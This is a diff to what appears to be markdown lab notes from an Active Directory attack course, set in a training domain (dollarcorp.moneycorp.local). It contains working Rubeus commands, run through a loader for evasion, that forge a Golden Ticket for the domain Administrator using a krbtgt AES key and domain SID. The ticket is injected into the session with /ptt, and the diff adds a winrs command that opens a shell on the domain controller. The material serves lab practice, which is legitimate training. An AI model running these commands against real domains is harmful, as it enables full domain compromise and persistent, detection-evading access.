@@ -24,15 +24,17 @@ Use Rubeus to forge a Golden ticket command with attributes similar to a normal 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
 ```
 
-
 > [!NOTE] **IMPORTANT**
 > Remember to add `/ptt` at the end of the generated command to inject the ticket into our current session
-
 
 Now we can run the generated command which is OPSEC Friendly forge. 
 ```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe evasive-golden 
 /aes256:<keys> /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
+```
+
+```powershell
+winrs -r:dcorp-dc cmd
 ```
 
 ```
